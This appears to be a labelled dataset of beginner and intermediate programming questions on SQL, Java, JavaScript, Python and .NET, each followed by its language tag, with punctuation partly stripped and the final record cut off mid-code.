count once time smilar id in sql  my aim is to count according to the <code>id</code>  once time same id it doesn t count every <code>id</code> each time.    i used this:   <pre><code>select count where id=1 between 1000; </code></pre>   but it counts to smilar <code>id</code>  more than one.,sql

when to use nullable columns - sql  in specs default columns are set as nullable meaning they optional  i m not clear what scenario is this good for to use with  i ll break it into two questions:   <ol> <li> why would i even want to use it in relational db  if integrity isn t important ill use other half-structured model. fearing for each row would it return usable object. seems it is pretty rare scenario to use them in relational db. </li> <li> handling it in programing language. is it even different in different languages  let s say php  what values should it be compared with  fetch_array() are even keys going to be set  </li> </ol>,sql
recursive sql problem  i have a problem that i would like have solved via a sql query. this is going to be used as a poc (proof of concept).    the problem:    product offerings are made up of one or many product instances  a product instance can belong to many product offerings. this can be realised like this in a table:   <pre><code>po | pi  -----  a | 10  a | 11  a | 12  b | 10  b | 11  c | 13 </code></pre>   now i would like to get back the product offer from a set of product instances. e.g. if we send in 10 11 13 the expected result back is b &amp; c  and if we send in only 10 then the result should be null since no product offering is made up of only 10. sending in 10 11 12 would result in a (not a &amp; b since 12 is not a valid product offer in it self).    prerequisites: the combination of product instances sent in can only result in one specific combination of product offerings  so there is only one solution to each query.,sql
map a subclass of a common element in relational database  i need to map a relation between a city council and its area of influence. each city has one area of influence and one subarea. each influence area has several subareas. for example    <pre><code>table city  - influence_area: foreign key to influence_area table  - influence_subarea: foreign key to influence_subarea table  table influence_area:  - name  table influence_suberea  - name  - influence_area: foreign key to influence_area table </code></pre>   so clearly there is a redundancy in the definition. is it good practice to reference only the subarea in the city table  what is the best practice in this case,sql
alternative sql ways of looking up multiple items of known ids   is there a better solution to the problem of looking up multiple known ids in a table:   <pre><code>select * from some_table where id= 1001  or id= 2002  or id= 3003  or ... </code></pre>   i can have several hundreds of known items. ideas,sql
selecting a date in the future  i am working on a shipment delivery report to determine if shipments are made within a shipment window.    every release has a ship_date value that is the date that the release must ship.  some releases though have a late window integer value that says if the shipment is made within x number of days then it is still considered on time.    this is complicated by another table which holds valid ship days for the month (used to exclude holidays  weekends  and such).   <pre><code>order_releases_table   part_no    quantity    ship_date    window  shipping_date   shipping_day </code></pre>   sample data   <pre><code>order_releases_table part_no  quantity  ship_date  window abc      100       9/1/2011   0 xyz      200       9/1/2011   2  shipping_date 9/1/2011 9/2/2011 9/5/2011 </code></pre>   so with this data part abc has to ship on 9/1 to be considered on time.  part xyz though can ship up to 2 days past 9/1 and still be considered on time  but since 9/3 isn t in our shipping days  then 9/5 is the last day it can ship and still be considered on time.    i think the answer lies in joining in a sub query of the shipping days table that assigns a row number to the shipping_day field.     <pre><code>select   row_number() over(order by shipping_date) as day_no    shipping_day from shipping_date where shipping_day &gt; ship_date  returns day_no  shipping_day 1       9/2/2011 2       9/5/2011 </code></pre>   then if i simply pick up the date where the day_no from this sub query is equal to window value from the release  i then have the last day a particular shipment can ship and still be considered on time.    i m having a hard time wrapping it all up in to the final query though.    is this the correct way to approach the problem,sql
select data from sql db per day  i have a table with order information in an e-commerce store. schema looks like this:    [orders]<br> id|subtotal|taxamount|shippingamount|datecreated    <strong>this table does only contain data for every order. so if a day goes by without any orders  no sales data is there for that day.</strong>    i would like to select subtotal-per-day for the last 30 days  including those days with no sales.    the resultset would look like this:    date       | salessum<br> 2009-08-01 | 15235<br> 2009-08-02 | 0<br> 2009-08-03 | 340<br> 2009-08-04 | 0<br> ...      doing this  only gives me data for those days with orders:   <pre><code>select datecreated as date  sum(ordersubtotal) as salessum from orders group by datecreated </code></pre>   you could create a table called dates  and select from that table and join the orders table. but i really want to avoid that  because it doesn t work good enough when dealing with different time zones and things...    please don t laugh. sql is not my kind of thing... :),sql

how to update a column value incrementally  i m experimenting with a personal finance application  and i m thinking about what approach to take to update running balances when entering a transaction in an account.    currently the way i m using involves retrieving all records more recent than the inserted/modified one  and go one by one incrementing their running balance.    for example  given the following transactions:    t1 date = 2008-10-21  amount = 500  running balance = 1000    t2 date = 2008-10-22  amount = 300  running balance = 1300    t3 date = 2008-10-23  amount = 100  running balance = 1400 ...    now suppose i insert a transaction between t1 and t2  then t2 and all subsequent transactions would need their running balances adjusted.    hehe  now that i wrote this question  i think i know the answer... so i ll leave it here in case it helps someone else (or maybe there s even a better approach )    first  i get the running balance from the previous transaction  in this case  t1. then i update all following transactions (which would include the new one):   <pre><code>update transactions set running_balance = running_balance + &lt;amount&gt; where date &gt; &lt;t1.date&gt; </code></pre>   the only issue i see is that now instead of storing only a date  i ll have to store a time too. although  what would happen if two transactions had the exact same date/time     ps: i d prefer solutions not involving propietary features  as i m using both postgresql and sqlite... although a postgre-only solution would be helpful too.,sql

should sql format the output or just retrieve the raw data   generally speaking  the sql queries that i write return unformatted data and i leave it to the presentation layer  a web page or a windows app  to format the data as required. other people that i work with  including my boss  will insist that it is more efficient to have the database do it. i m not sure that i buy that and believe that even if there was a measurable performance gain by having the database do it  that there are more compelling reasons to generally avoid this.    for example  i will place my queries in a data access layer with the intent of potentially reusing the queries whenever possible. given this  i ascertain that the queries are more likely to be able to be reused if the data remains in their native type rather than converting the data to a string and applying formatting functions on them  for example  formatting a date column to a dd-mmm-yyyy format for display. sure  if the sql was returning the dates as formatted strings  you could reverse the process to revert the value back to a date data type  but this seems awkward  for lack of a better word. furtehrmore  when it comes to formatting other data  for example  a machine serial number made up of a prefix  base and suffix with separating dashes and leading zeros removed in each sub field  you risk the possibility that you may not be able to correctly revert back to the original serial number when going in the other direction. maybe this is a bad example  but i hope you see the direction i am going with this...    to take things a step further  i see people write very complex sqls because they are essentially writing what i would call presentation logic into a sql instead of returning simple data and then applying this presentation logic in the presentation layer. in my mind  this results in very complex  difficult to maintain and more brittle sql that is less adaptable to change.    take the following real-life example of what i found in our system and tell me what you think. the rational i was given for this approach was that this made the web app very simple to render the page as it used the following 1-line snippet of classic ado logic in a classic asp web app to process the rows returned:   <pre><code>     ors.getstring (      &lt;/td&gt;  &amp; vbcrlf &amp;  &lt;td style=  font-size:x-small   nowrap&gt;    &lt;/td&gt;  &amp; vbcrlf &amp;  &lt;/tr&gt;  &amp; vbcrlf &amp;  &lt;tr&gt;  &amp; vbcrlf &amp; _       &lt;td style=  font-size:x-small   nowrap&gt;    &amp;nbsp;  ) &amp;  &lt;/td&gt;  &amp; vbcrlf &amp;  &lt;/tr&gt;  &amp; vbcrlf &amp; _ </code></pre>   here s the sql itself. while i appreciate the author s ability to write a complex sql  i feel like this is a maintenance nightmare. am i nuts  the sql is returning a list of programs that are current running against our database and the status of each:    because the sql did not display with cr/lfs when i pasted here  i decided to put the sql on an otherwise empty personal google site. please feel free to comment. thanks.    by the way-this sql was actually constructed using vb script nested within a classic asp page  not calling a stored procedure  so you have the additional complexity of embedded concatentations and quoted markup  if you know what i mean  not to mention lack of formatting. the first thing i did when i was asked to help to debug the sql was to add a debug.print of the sql output and throw it through a sql formatter that i just found. some of the formatting was lost in pasting at the following link:    edit(andomar): copied inline: (external link removed  thanks-chad)   <pre><code>select  substring(datename( dw  start_datetime) 1 3)  +      + cast(start_datetime as varchar)  start time (utc/gmt)   program_name  program name   run_sequence  run sequence   case  when batchno = 0 then char(160) when batchno = null then char(160) else cast(batchno as varchar) end  batch #  /*  replace(replace(detail_log   k:\    file://servernamehere/diskvolk/ )   \    / )  log */ /* */  cast( &lt;a href= gois_viewlog.asp program_name=  as varchar(99)) + cast(program_name as varchar) + cast( &amp;run_sequence=  as varchar) + cast(run_sequence as varchar) + cast( &amp;page=1  as varchar) +    + cast(  &gt;

how do i add a highscore system to my game   i am trying to implement a highscore system into my skeet shooting game. this all runs in the console. i need the game to save the highscore with the player s name  so i am assuming i need to put them into an array. i am not sure how to go about adding the scores and names to an array in my current code  though.    <pre><code>public class target {  public static int score = 0; public static int i = 0; public static string gamestart;      public void targetinfo(player l) {          scanner scan = new scanner(system.in);          //loop for all 25 targets         for(i=0; i&lt;25; i++) {          system.out.println( \nhit enter to shoot );         gamestart = scan.nextline();          if(gamestart.equals(  )){              int random1 = (int) (math.random() * 105 + 15);          //distance 15-35ft         if (random1 &gt;= 15 &amp;&amp; random1 &lt;= 35) {              system.out.println( your target is   + random1 +  ft away );              int random2 = (int) (math.random() * 5 + 1);              if(random2&lt;=3) {                  score++;                 system.out.println( you got one! );             }             else{                  system.out.println( you missed );             }          }             //distance 36-75ft             else if (random1 &gt;=36 &amp;&amp; random1 &lt;=75) {                  system.out.println( your target is   + random1 +  ft away );                  int random3 = (int) (math.random() * 21 + 1);                  if (random3 &lt;= 11) {                      score++;                     system.out.println( you got one! );                 }                 else{                      system.out.println( you missed );                 }              }             //target distance 76-105ft             else if (random1 &gt;=76 &amp;&amp; random1 &lt;=105){                  system.out.println( your target is   + random1 +  ft away );                  int random4 = (int) (math.random() * 11 + 1);                      if (random4 &lt;= 2) {                          score++;                         system.out.println( you got one! );                     }                         else{                              system.out.println( you missed );                 }              }      } }          system.out.println(l.name +    your score is:   + score);       } </code></pre>   },java
javascript: how to copy reference properly   i have array and two variables. these variables are meant to hold references to array items  in fact  to select new object and hold previously selected. this code makes selectedobject and prevselectedobject to be the same :(   <pre><code>if(newselection) {     if(this.prevselectedobject != newselection)     {         this.prevselectedobject = this.selectedobject;     }      this.selectedobject = newselection; } else {     this.prevselectedobject = this.selectedobject;     this.selectedobject = null; } </code></pre>   guess  this.prevselectedobject = this.selectedobject; actually puts in prevselectedobject variable reference to selectedobject. but i want to copy reference that is in selectedobject to prevselectedobject. there are dirty hacks for copy-by-value if value is string or int  but what to do with references,javascript

fade element in and run a callback  ok  i ve tried this many different ways. i m trying to learn javascript without always resorting to jquery. i m trying to create similar functionality for fading an element in and then out (using callbacks as arguments).    given this element: <code>&lt;div id= something &gt;asdf&lt;/div&gt;</code>    when i run this javascript (or something similar)  i end up either getting flickering effects (i think it s from both the <code>fadein</code> and <code>fadeout</code> functions running) or just having it fade in. more problems happen when i try to do this to several elements at once (in a for loop)  but i m guessing that  closures  will be the answer to that. one thing at a time.   <pre><code>function setopacity(element  value) {     element.style.opacity = value/100;     element.style.filter =  alpha(opacity=  + value +  ) ; }  function fadein(element  speed  callback) {     if( ! speed ) { speed = 1000; }     var speed = speed / 100;     for (var i = 0; i &lt; 100; i++) {         settimeout((function(i){ return function(){ setopacity(element  i); } })(i)  (i * speed));     }     if (callback &amp;&amp; typeof(callback) ===  function ) {         settimeout(function(){             return function() {                 callback();             }         }  (100 * speed));     } }  function fadeout(element  speed  callback) {     if( ! speed ) { speed = 1000; }     var speed = speed / 100;     for (var i = 100; i &gt; 0; i--) {         settimeout((function(i){ return function(){ setopacity(element  i); } })(i)  ((100 - i) * speed));     }     if (callback &amp;&amp; typeof(callback) ===  function ) {         settimeout(function(){             return function(){                 callback();             }         }  (100 * speed));     } }  element = document.getelementbyid( something ); element.onclick = function() {     fadein(element  1000  function() {         fadeout(element  1000  function() {             // all done         });     }); } </code></pre>,javascript

slot machine program incorrect output  i ve been working on a problem for my java class where we must create 3 slot machine objects and play them until we have run out of quarters. the first machine pay 30 quarters every 40th time it was play which has been played 30 times. the second machine pays out 60 quarters every 85th time it was played which was played 10 times and the third machine pays out 11 quarters every 10th time it was played which has been played 9 times. i ve then counted the amount of times the machines have been played until they have run out of money. after i run the program  it says it played the machines 18770 times  however  i compared it to my other classmates and their output are different at a value of 33569 for each of them. here s my code:   <pre><code> import java.util.scanner;  public class slots {  public static void main(string[] args) {     scanner input = new scanner(system.in);     slotmachines game1 = new slotmachines(30  40);     slotmachines game2 = new slotmachines(60  85);     slotmachines game3 = new slotmachines(11  10);     int quarters;     int plays = 0;     int play1  play2  play3;     system.out.println( how many quarters are in the jar: \n );     quarters = input.nextint();     system.out.println( how many times has the first machine been played: \n );     play1 = input.nextint();     play1 = game1.setcounter(play1);     system.out.println( how many times has the second machine been played: \n );     play2 = input.nextint();     play2 = game2.setcounter(play2);     system.out.println( how many times has the third machine been played: \n );     play3 = input.nextint();     play3 = game3.setcounter(play3);     while(quarters != 0){         plays++;         quarters--;         game1.game();         quarters += game1.game();         if(quarters != 0){             plays++;             quarters--;             game2.game();             quarters += game2.game();         }         if(quarters != 0){             plays++;             quarters--;             game3.game();             quarters += game3.game();         }     }     system.out.println( marge played a total of   + plays +   times );    } </code></pre>   }    and here s the second class:   <pre><code> public class slotmachines {     int payout;    int playlimit;    int counter;       public slotmachines(int payout  int playlimit) {        this.payout = payout;        this.playlimit = playlimit;    }      public void setpayout(int payout) {        this.payout = payout;    }     public int getpayout() {        return payout;    }     public void setplaylimit(int playlimit) {        this.playlimit = playlimit;    }     public int getplaylimit() {        return playlimit;    }     public int setcounter(int counter){        this.counter = counter;        return this.counter;    }     public int getslotcounter() {        return counter;    }      public int game() {        int result = 0;        counter++;        if (counter &gt;= playlimit) {            counter = 0;            result = payout;        }        return result; } } </code></pre>   here s my output:    how many quarters are in the jar:     5000    how many times has the first machine been played:     30    how many times has the second machine been played:     10    how many times has the third machine been played:     9     marge played a total of 18770 times    since the amount of times played is 18770  i would like to know why it s coming like this and why/how i could make the output equal to 33569.,java
how to subtract total from conditioned sum in sql  i want to do the following:    1) find the total rows in a table<br> 2) find the total rows that meets a certain criteria.    3) subtract (1) from (2).    sample table employees:   <pre><code>    employeeid  nationality     1           brazil     2           korea     3           germany     4           brazil     5           brazil </code></pre>   what i ve tried:   <pre><code>    select count(employeeid) as total from employees     union     select count(employeeid) as brazilians from employees     where nationality =  brazil  </code></pre>   result:   <pre><code>total 5 3 </code></pre>   row 1 will give me the total employees. row 2 will give me the brazilian employees.  i used union to see if i could subtract row 2 from row 1.    i could do this using case and sum()  but that would require the row_number() function  which i can t use given that i m using websql. is there another way to index these rows to be able to subtract     is there another approach i could use to solve this seemingly simple problem,sql

java program to count characters  words  and lines from a text file  i am trying to write a program that gathers statistics on a text file in a way that is similar to word processors which tell you how many characters  words  and lines you have written.    the purpose of this program is to ask the user for the name of a file (<strong>using a scanner</strong>) and output the statistics.    here is what i have so far:   <pre><code>public class docstats { private file inputfile; private scanner in;  // sets users input (string attribute) to a file name public docstats(string string) throws filenotfoundexception {     try {         file inputfile = new file(string);         scanner in = new scanner(inputfile);          this.inputfile = inputfile;         this.in = in;     } catch (ioexception exception) {         system.out.println( could not open the file );     } }  // gets the number of characters in a text public int getnumberofcharacters() {     int numchar = 0;      while (in.hasnext()) {         string line = in.nextline();         numchar += line.length();     }      return numchar; }  // gets the number of words in a text public int getnumberofwords() {     int numwords = 0;      while (in.hasnextline()) {         string line = in.nextline();         numwords += new stringtokenizer(line      ).counttokens();     }      return numwords; }  // gets the number of lines in a text public int getnumberoflines() {     int numlines = 0;     while (in.hasnextline()) {         numlines++;     }     return numlines; } } </code></pre>   after i test my class in the main method  i do not get correct outputs. here is the main method:   <pre><code>import java.io.*;  public class main {  public static void main(string[] args) throws filenotfoundexception {     docstats doc = new docstats( goblin.txt );      system.out.println( number of characters:               + doc.getnumberofcharacters()); // outputs 1402  instead of 1450      system.out.println( number of words:   + doc.getnumberofwords()); // outputs                                                                         // 0                                                                         // instead                                                                         // of                                                                         // 257     system.out.println( number of lines:   + doc.getnumberoflines()); // outputs                                                                         // 0                                                                         // instead                                                                         // of                                                                         // 49 } } </code></pre>   could anyone point out why my code does not work and suggest any alternative way to fix it,java

combining data from two tables into one row  i ve read around quite a bit for a solution to my problem but i can t seem to get it to work. it seems like a simple problem but i m not getting the result set i want.    i m working on a report that needs to pull from two tables and essentially create one row of data for each employee. the file needs to be uploaded to a healthcare vendor.    here is an example of the data    table1: employeecheckdeduction   <pre><code>employee id  deduction amount  check date        1234             50.00   6/30/2015        1234             50.00   7/15/2015        4567            100.00   6/30/2015        4567            100.00   7/15/2015        9876             75.00   6/30/2015        9876             75.00   7/15/2015 </code></pre>   table2: employercontribution   <pre><code>employee id  contribution amount  check date        1234                25.00   6/30/2015         1234                30.00   7/15/2015        4567                50.00   6/30/2015        4567                60.00   7/15/2015 </code></pre>   part of the problem is that not every record in table1 will have a corresponding match in table 2. if they are maxed out on contributions  they won t receive one on that pay. what i want is a result set that looks like this:   <pre><code>employee id  deduction amount  contribution amount  check date        1234             50.00                25.00   6/30/2015        1234             50.00                30.00   7/15/2015         4567            100.00                50.00   6/30/2015        4567            100.00                60.00   7/15/2015        9876             75.00                 0.00   6/30/2015        9876             75.00                 0.00   7/15/2015 </code></pre>   no matter how i try and join  it s just duplicating data. i ve tried using subqueries or distinct records and no matter what i try  it s not giving me what i want. i can t figure out what i m doing wrong.    edit. see links below for dataset results.    <a href= http://s000.tinyupload.com/index.php file_id=01551050904538574848  rel= nofollow >http://s000.tinyupload.com/index.php file_id=01551050904538574848</a>    <a href= http://s000.tinyupload.com/index.php file_id=63978789937644749322  rel= nofollow >http://s000.tinyupload.com/index.php file_id=63978789937644749322</a>    <a href= http://s000.tinyupload.com/index.php file_id=28700836121558977952  rel= nofollow >http://s000.tinyupload.com/index.php file_id=28700836121558977952</a>    i think part of the problem is that in the employee check deduction table there is a specific deduction code that i m pulling out. in the employer deduction table that code also exists. however  whenever i try and add the join on those 2 fields in addition to employee id and check date  it doesn t return results from the employees who have a deduction amount in the employee check deduction table when they don t have a corresponding record in the employer contribution table. i hope that helps.,sql

what is this syntax called  `new type() { ... }`  i know that java will let you do trickery with a variable s type when initializing a class variable. along the lines of:   <pre><code>sometype foo = new sometype() {     {         this.foofield = 12345;     }     @override public void somemethod() {         throw new reallyweirdexception();     } }; </code></pre>   which will create an instance variable <code>foo</code> where <code>somemethod()</code> has different semantics than in the usual <code>sometype</code>  and where <code>foofield</code> is initialized to a value other than its normal default.    but what is the <code>new type() { ... }</code> syntax called,java
confusion with a while statement evaluating if a number is triangular  i ve been having troubles trying to figure out how to solve a function. i ve been assigned the development of a little programme which tells if a number is  triangular  (a number is triangular when the addition of certain consecutive numbers in the [1 n] interval is n. following the definition  the number 10 is triangular  because in the [1 10] interval  1+2+3+4=10).    i ve coded this so far:   <pre><code>class triangularnumber{    boolean numtriangular(int n) {     boolean triangular = false;     int i = n;     while(n&gt;=0 &amp;&amp; triangular){     //ue06 is a class which contains the function  f0   which makes the addition of all the numbers in a determined interval     ue06 p = new ue06();       if ((p.f0(1  i))==n)         triangular = true;       else         i=i-1;     }     return triangular;   }  boolean testtriangular = numtriangular(10) == true &amp;&amp;    numtriangular(7) == false &amp;&amp;    numtriangular(6) == true;    public static void main(string[] args){      triangularnumber p = new triangularnumber();     system.out.println( testtriangular =   + p.testtriangular);    }  } </code></pre>   according to those boolean tests i made  the function is wrong. as i see the function  it goes like this:    <ol> <li>i state that the input number in the initial state isn t triangular (triangular=false) and i=n (determining the interval [1 i] where the function is going to be evaluated</li> <li>while n is greater or equals 0 and the number isn t triangular  the loop starts</li> <li>the loop goes like this: if the addition of all the numbers in the [1 i] interval is n  the number is triangular  causing the loop to end. if that statement is false  i goes from i to (i-1)  starting the loop again with that particular interval  and so on till the addition is n.</li> </ol>   i can t spot the error in my  algorithm   any advice     thanks!,java

javascript bitwise operators  i m trying to figure out some differences between c# and javascript. ok  take this code in javascript:   <pre><code>var j = 0x783a9b23; var bt = ((16843134 ^ (16843134 - 1)) * j); </code></pre>   after executing this   bt  will be 6051320169.     now after doing this in c#:   <pre><code>int j = 0x783a9b23; int bt = ((16843134 ^ (16843134 - 1)) * j); </code></pre>    bt  will be 1756352873. certainly not the same. any ideas why javascript is not seeing how c# sees it,javascript
square a number with functions in python  this is an extremely easy question for python.  it s very basic python as i m still a beginner...  to take a number  use a function and square it:   <pre><code>import math nmb = int(raw_input( enter a number to be squared:  )) def square(nmb):     y = math.pow(nmb 2)     return y print str(nmb) +   squared is equal to   + str(square) </code></pre>   i ve jiggered it around a few times  but the end result always prints something like  5 squared is equal to function square at 0x02bc87b0  instead of the result    i feel like i m missing something really obvious  as my understanding of functions is still quite basic  but any pointers would set me on my way!,python

what does  this  refer to in javascript parasitic inheritance   after years of creating applications using prototypal inheritance in javascript  i ve started to explore using parasitic inheritance. despite its primary pitfall - at least to me - of potentially creating several copies of methods in memory as you create an object hierarchy  i m finding that it really resonates with me with its simplicity and the fact that  new  is rendered unnecessary. however  i m stuck on what happens with  this.  most of the examples i ve seen online only scratch the surface showing how to implement parasitic inheritance like so:   <pre><code>   function foo() {        return {           method1 : function() {...}        }    }     function bar() {        var that = foo();        that.method2 = function() {            //is  this  pointing to bar()         }        return that;    } </code></pre>   as i asked in the comment in the bar() object  does  this  refer to bar() or is the scope of this relegated to method2     thanks!,javascript

improving newton s method recursion  i have solved a previous problem and now i am stuck with this one.  it is asking for an improvement of the previous solution which i posted below  but can t quite understand what the problem is asking. (also  can t really figure out how to solve it.)  please help  thanks.    problem: elena complains that the recursive newton function in project 2 includes an extra argument for the estimate. the function’s users should not have to provide this value  which is always the same  when they call this function. modify the definition of the function so that it uses a keyword parameter with the appropriate default value for this argument  and call the function without a second argument to demonstrate that it solves this problem.    here is my code:   <pre><code>def newtonsquare(x  estimate):     if abs(x-estimate ** 2) &lt;= 0.000001:         return estimate     else:         return newtonsquare(x  (estimate + x / estimate) / 2)  def main():     num = int(raw_input( enter a positive number &gt;&gt;  ))     print newtonsquare(num  1.0)  main() </code></pre>,python

how to iterate over numerically named object properties in defined order   in theory  the order of iteration over object properties is not guaranteed.  in practice  there is a de-facto standard about it. ie&lt;9  firefox  safari always iterate in the order of definition. opera  ie9  chrome iterate in the order of definition for string keys. numeric keys become sorted and go before string keys.    i have an object-filled array  the all keys are numbers. how can i iterate over those object properties in defined order. in ie9 and chrome  the numeric keys are always sorted before iteration.,javascript

which is more efficient in python: list.index() or dict.get()  i m trying to solve <a href= https://oj.leetcode.com/problems/two-sum/  rel= nofollow >a problem on leetcode.</a> i m using python and i made an attempt as follows:   <pre><code>def twosum(self  num  target):     index0 = 0     index1 = -1      for item in num:         index0 += 1         other = target - item         try:             index1 = num[index0:].index(other)             index1 += index0 + 1         except valueerror:             continue         else:             break     return index0  index1 </code></pre>   but i always get the result: <code>time limit exceeded</code><br> the idea of my code is to check whether <code>element(other = target - item)</code> in the list  and i used the <code>index()</code> method for this.    the right answer offered on the internet is as follows:   <pre><code>def twosum(self  num  target):     length = len(num)     dic = {}     for i in xrange(length):         dic[num[i]] = i     index0 = -1     index1 = -1      for key in xrange(length):  #not  for key in dic.values():           other = target - num[key]         index1 = dic.get(other)         #[1  2  3  4]  4:   2 2 is not the expected answer.         if index1 and index1 != key:             index0 = key + 1             index1 += 1             break      return index0  index1 </code></pre>   it s ok  but i don t understand what s wrong with my code  is <code>list.index()</code> slower than <code>dict.get()</code>,python
is there a concise list of .net 3.0 to 4.0 bcl deltas   does anybody know of or have a detailed list of how the bcl in .net 4.0 has changed from 3.0   in other words  what types have been added or deprecated (or how have they changed)     all i have been able to find is the list of new features  such as the wikipedia <a href= http://en.wikipedia.org/wiki/c_sharp_(programming_language)#features_of_c.23_4.0  rel= nofollow noreferrer >article</a>  any of the endless msdn blogs entries about it  or some questions here on so (<a href= https://stackoverflow.com/questions/888893/whats-new-in-c-4-for-a-static-typed-guy >#1</a>  <a href= https://stackoverflow.com/questions/237041/confirmed-features-of-net-4-0 >#2</a>).  knowing about those is important  but i am also interested in what new types we have to use.    taking a gander using vs2010 beta 1  i noticed a few new ones that looked interesting and fun:   <ol> <li><a href= http://msdn.microsoft.com/en-us/library/system.numerics.biginteger(vs.100).aspx  rel= nofollow noreferrer ><code>biginteger</code></a></li> <li><a href= http://msdn.microsoft.com/en-us/library/dd642331(vs.100).aspx  rel= nofollow noreferrer ><code>lazy&lt;t&gt;</code></a></li> <li>the whole <a href= http://msdn.microsoft.com/en-us/library/system.collections.concurrent(vs.100).aspx  rel= nofollow noreferrer >system.collections.concurrent</a> namespace.</li> <li>additions to threading such as <a href= http://msdn.microsoft.com/en-us/library/system.threading.parallel(vs.100).aspx  rel= nofollow noreferrer >parallel</a> types and <a href= http://msdn.microsoft.com/en-us/library/system.threading.tasks(vs.100).aspx  rel= nofollow noreferrer >tasks</a> namespace</li> <li><a href= http://msdn.microsoft.com/en-us/library/system.windows.forms.datavisualization.charting(vs.100).aspx  rel= nofollow noreferrer >charting</a> namespace</li> <li>etc...</li> </ol>   i know that it is still in beta and things could change  but i think it s worth trying to get a leg up on learning about all the new classes now (not just the hyped-up ones).    i don t really feel like writing my own reflect-and-diff tool to generate this list  so i m hoping the list (or the tool to generate it) already exists.      by the way  i already checked <a href= http://www.red-gate.com/products/reflector/  rel= nofollow noreferrer >reflector</a> s <a href= http://www.codeplex.com/reflectoraddins  rel= nofollow noreferrer >add-ins</a> and the <a href= http://www.codingsanity.com/diff.htm  rel= nofollow noreferrer >diff</a> one (while being great) doesn t feel quite right.  i think it would be great for getting down to the dirty details  but seems like overkill for just getting the list of the high-level deltas.    edit:    using bdukes answer  i have created a google docs <a href= http://spreadsheets.google.com/pub key=rpsf2ykprsb2lfloarflpuw  rel= nofollow noreferrer >spreadsheet</a> that lists all the new types in 4.0 as of beta 1.  it also contains links to the msdn online documentation (or a google search for generic types since their uri is not as easy to autogenerate).,.net

storing data input by the user  i m having trouble coming up with a way to store information i want to get from a user and then return those same stats at the end of the method. the problem in question is to repeatedly ask the user to name animals and how many of said animals remain in the wild. i then want my program to store these inputs without creating a few hundred variables (the problem in question) and then print the least endangered animal when the loop is terminated.    if what i m asking is unclear  here is the fragment of code that is causing me trouble:   <pre><code>while (!animals.equalsignorecase( exterminate ))  {     animals = input( name an animal );     if (animals.equalsignorecase( exterminate ))     {      print( the least endangered animal is   + animals);      print( there are still   + numberanimals +   left in the wild );      break;     }     else     {      remaining = input( how many are left in the wild  );      numberanimals = integer.parseint(remaining);     }     } </code></pre>   i am aware that arrays are likely to solve this problem but i don t understand how i would implement one into the while loop.    edit: the essence of my problem is trying to find a way to print the least endangered animal at the end of the loop because  as it stands  the terminate code  exterminate  gets printed instead of the animal,java

is there a better reference container than a one-element array   a java anonymous class can only access a variable from the surrounding method if that variable is <code>final</code>  and hence the inner class can t write to that variable. in order to capture an object created by an enclosed type  i ve created a <code>final</code> single-element array to act as a reference:   <pre><code>    final string[] ref = new string[1];     final runnable runnable = new runnable() {         public void run() {             ref[0] =  hello world ;         }     };      runnable.run();     system.out.println(ref[0]); </code></pre>   this appears to work  and i imagine has good performance. but it feels slightly hacky.    obviously it is trivial to write a <code>ref</code> class to replace this such that:   <pre><code>    final ref&lt;string&gt; ref = new ref&lt;&gt;();     final runnable runnable = new runnable() {         public void run() {             ref.set( hello world );         }     };      runnable.run();     system.out.println(ref.get()); </code></pre>   ... is there an existing class in the standard java runtime that does this      i ve looked at <code>java.lang.ref.reference</code>  and this isn t the same thing. these are immutable  the only implementations are for weak/phantom references.,java

id fields in sql tables: rule or law   just a quick database design question: do you always use an id field in every table  or just most of them   clearly most of your tables will benefit  but are there ever tables that you might not want to use an id field       for example  i want to add the ability to add tags to objects in another table (foo).  so i ve got a table footag with a varchar field to hold the tag  and a fooid field to refer to the row in foo.  do i really need to create a clustered index around an essentially arbitrary id field   wouldn t it be more efficient to use fooid and my text field as the clustered index  since i will almost always be searching by fooid anyway   plus using my text in the clustered index would keep the data sorted  making sorting easier when i have to query my data.  the downside is that inserts would take longer  but wouldn t that be offset by the gains during selection  which would happen far more often     what are your thoughts on id fields   bendable rule  or unbreakable law     edit: i am aware that the example provided is not normalized.  if tagging is to be a major part of the project  with multiple tables being tagged  and other  extras   a two-table solution would be a clear answer.  however in this simplest case  would normalization be worthwhile   it would save some space  but require an extra join when running queries,sql

the straw picking game: helping the computer learn from its  mistakes   so i have the game already programmed. you take turns against the computer picking 1-3 straws and the point of the game is to leave the opponent with 1 straw. that entire section works  but now i have to program the computer to get smarter through consecutive play.     i m not entirely sure how this is done  however. the way it was explained to me was that you have 4  cups   which i assume are arrays. each cup contains the moves  (1  2  3). during the computer s turn it randomly picks a cup and randomly chooses one of the three moves. if that move doesn t work then it removes it from the cup.    after several games the computer should become unbeatable.i m going to keep working on this but i m having a lot of trouble. i ve been at it for a couple hours now so i ll just post the raw code without my broken parts.    edit: i ve added the cup class at the bottom.   <pre><code>import java.util.*; public class nim {    public static void main(string[] args)    {   random r = new random();   scanner kb = new scanner(system.in);   string reply;    int straws  cupnum  prevcupnum  prevcomputermove         computermove  humanmove  gamenumber = 0  humanwin = 0;    // create an array of four cups   cup[] cup = new cup[4];   for (int i = 0; i &lt; cup.length; i++)      cup[i] = new cup();     system.out.println( let s play nim );   system.out.println();   do   {      gamenumber++;      straws = r.nextint(11) + 10;        // add 1 if necessary so computer nevers starts in losing config             if (straws%4 == 1)         straws++;      system.out.println( straws to start =   + straws);      system.out.println();       // set to -1 to indicate just starting so no previous move      prevcupnum = -1;      // no prev move so init to -1      prevcomputermove = -1;       do      {         cupnum = straws%4;   // get cup number          // if cup is empty  then use 1 for move         if (cup[cupnum].count() == 0)  // cup empty then move = 1            computermove = 1;            else            computermove = cup[cupnum].select(); // get move from cup            /*missing code         if cup is cup number 1  then remove the previous move         from the previous cup unless already empty*/          system.out.println            ( computer picks up   + computermove +   straws );         straws = straws - computermove;         if (straws &lt; 0)            straws = 0;         system.out.println(straws +   left );         system.out.println();          // save this move so it can be removed later if necessary         prevcupnum = cupnum;         prevcomputermove = computermove;          if (straws == 0)         {            system.out.println( wow.  you win! );            humanwin++;             /* missing code             remove last move computer made from cup*/         }         else  // get move from human         {            system.out.println();            do            {               system.out.print( your move: enter  );                if (straws == 1)                  system.out.println( 1 );               else               if (straws == 2)                  system.out.println( 1 or 2 );               else               if (straws &gt;= 3)                  system.out.println( 1  2  or 3 );                humanmove = kb.nextint();            } while               (humanmove &gt; 3 || humanmove &lt; 1 || straws - humanmove &lt; 0);             straws = straws - humanmove;            system.out.println(straws +   left );            if (straws == 0)            {                  system.out.println();               system.out.println( ha  ha.  you lose! );            }         }      } while (straws &gt; 0);        system.out.println         ( score: human   + 